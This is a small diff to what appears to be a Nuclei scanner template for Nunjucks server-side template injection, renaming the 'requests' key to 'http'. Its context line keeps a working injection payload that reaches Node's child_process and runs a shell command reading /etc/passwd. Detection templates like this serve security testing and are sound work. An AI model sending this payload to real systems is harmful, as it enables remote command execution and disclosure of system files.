@@ -8,7 +8,7 @@ info:
   severity: high
   tags: node,nunjucks,ssti
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/page?name={{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}"
